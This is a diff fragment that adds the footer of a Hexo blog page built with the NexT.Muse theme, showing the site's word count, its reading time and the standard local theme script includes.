+    <span title="站点总字数">144k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:23</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
